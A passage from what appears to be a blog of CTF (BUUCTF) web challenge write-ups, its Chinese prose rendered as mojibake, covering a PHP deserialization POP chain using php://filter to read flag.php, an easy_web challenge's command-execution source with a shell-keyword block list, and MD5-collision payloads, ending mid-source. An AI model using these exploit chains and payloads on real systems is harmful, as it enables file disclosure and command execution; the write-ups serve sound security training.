</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…ˆæ‰¾å…¥å£<code>__construct</code>ï¼Œå‘ç°<code>__get()</code>å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå‡½æ•°å¯ä»¥è§¦å‘<code>__invoke</code>æ–¹æ³•ï¼Œæ‰€ä»¥è®©<code>p=new Modifier()</code>,è¿™é‡Œä¼šè°ƒç”¨appendæ¥è¯»å–varçš„å€¼ï¼Œæˆ‘ä»¬varè®¾ç½®ä¸ºä¼ªåè®®è¯»flag,è¿˜å‰©ä¸¤ä¸ªæ–¹æ³•æ²¡è¢«è§¦å‘</p>
<p><code>__tostring</code>å¯ä»¥ç”±showä¸‹é¢çš„<code>__wakeup()</code>é‡Œé¢çš„æ­£åˆ™åŒ¹é…ä¼šæŠŠsourceå˜å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å¯ä»¥è®©<code>source=new Show()</code>,è§¦å‘ä¹‹åä¼šè¿”å›str-&gt;source,è¿™é‡Œå¦‚æœå°†strä¼ ç»™<code>__get()</code>,ç”±äºä¼šè¾“å‡ºä¸å­˜åœ¨çš„å˜é‡sourceæˆåŠŸè§¦å‘</p>
<p>æ‰€ä»¥å®Œæ•´çš„popé“¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">new</span> <span class="n">showè§¦å‘__construct</span><span class="p">,</span><span class="err">ç„¶å</span><span class="n">source</span><span class="o">=</span><span class="n">new</span> <span class="n">showè§¦å‘__tostring</span><span class="p">,</span><span class="nb">str</span><span class="o">=</span><span class="n">new</span> <span class="n">testè§¦å‘__get</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">new</span> <span class="n">Modifier</span><span class="p">()</span><span class="err">è§¦å‘</span><span class="n">__invoke</span><span class="p">,</span><span class="err">æœ€åè°ƒç”¨</span><span class="n">appendè¾“å‡ºflag</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="o">=</span><span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">=</span><span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="nv">$c</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">p</span><span class="o">=</span><span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å®‰æ´µæ¯-2019easy_web">[å®‰æ´µæ¯ 2019]easy_web
</h2><p>å›¾ç‰‡urlçœ‹èµ·æ¥æ˜¯base64</p>
<p>è§£ç çœ‹çœ‹</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836.png"
	width="1650"
	height="845"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836_hu18198552740549756126.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215221837836_hu2534495837598624071.png 1024w"
	loading="lazy"
	
		alt="image-20250215221837836"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="468px"
	
></p>
<p>ä¸¤æ¬¡base64åŠ ä¸€ä¸ªhexè½¬ascii</p>
<p>æ„é€ index.phpè¯»å–</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287.png"
	width="1630"
	height="791"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287_hu5885471893544763700.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222010287_hu8338634857043800619.png 1024w"
	loading="lazy"
	
		alt="image-20250215222010287"
	
	
		class="gallery-image" 
		data-flex-grow="206"
		data-flex-basis="494px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542.png"
	width="1208"
	height="484"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542_hu17008549295610857005.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222154542_hu3795412211393294775.png 1024w"
	loading="lazy"
	
		alt="image-20250215222154542"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="599px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span> <span class="o">||</span> <span class="o">~</span> <span class="nx">E_NOTICE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;content-type:text/html;charset=utf-8&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]))</span> 
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">hex2bin</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">])));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/[^a-zA-Z0-9.]+/&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/flag/i&#34;</span><span class="p">,</span> <span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;img src =&#34;./ctf3.jpeg&#34;&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;xixiï½ no flag&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$txt</span> <span class="o">=</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span> <span class="o">.</span> <span class="nv">$txt</span> <span class="o">.</span> <span class="s2">&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$cmd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|;|,|\*|\?|</span><span class="se">\\</span><span class="s2">|</span><span class="se">\\\\</span><span class="s2">|</span><span class="se">\n</span><span class="s2">|</span><span class="se">\t</span><span class="s2">|</span><span class="se">\r</span><span class="s2">|</span><span class="se">\xA0</span><span class="s2">|\{|\}|\(|\)|\&amp;[^\d]|@|\||</span><span class="se">\\</span><span class="s2">$|\[|\]|{|}|\(|\)|-|&lt;|&gt;/i&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;forbid ~&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="sb">`$cmd`</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="p">(</span><span class="s2">&#34;md5 is funny ~&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œè¦md5å¼ºæ¯”è¾ƒç»•è¿‡åªèƒ½æ‰¾payloadäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
</span></span><span class="line"><span class="cl">æˆ–è€…
</span></span><span class="line"><span class="cl">a=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;b=psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878.png"
	width="1919"
	height="719"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878_hu12984690349972161922.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215222907878_hu3114976661799729823.png 1024w"
	loading="lazy"
	
		alt="image-20250215222907878"
	
	
		class="gallery-image" 
		data-flex-grow="266"
		data-flex-basis="640px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692.png"
	width="1874"
	height="721"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692_hu15115081612965511664.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250215223019692_hu17755552159924547355.png 1024w"
	loading="lazy"
	
		alt="image-20250215223019692"
	
	
		class="gallery-image" 
		data-flex-grow="259"
		data-flex-basis="623px"
	
></p>
<h2 id="mrctf2020pywebsite">[MRCTF2020]PYWebsite
</h2><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281.png"
	width="1755"
	height="615"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281_hu13492116411185021395.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250216151521281_hu6894982447828342798.png 1024w"
	loading="lazy"
	
		alt="image-20250216151521281"
	
	
		class="gallery-image" 
		data-flex-grow="285"
		data-flex-basis="684px"
	
></p>
<h2 id="å®‰æ´µæ¯-2019easy_serialize_php">[å®‰æ´µæ¯ 2019]easy_serialize_php
</h2><p>æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$function</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">filter</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filter_arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;flag&#39;</span><span class="p">,</span><span class="s1">&#39;php5&#39;</span><span class="p">,</span><span class="s1">&#39;php4&#39;</span><span class="p">,</span><span class="s1">&#39;fl1g&#39;</span><span class="p">);</span>
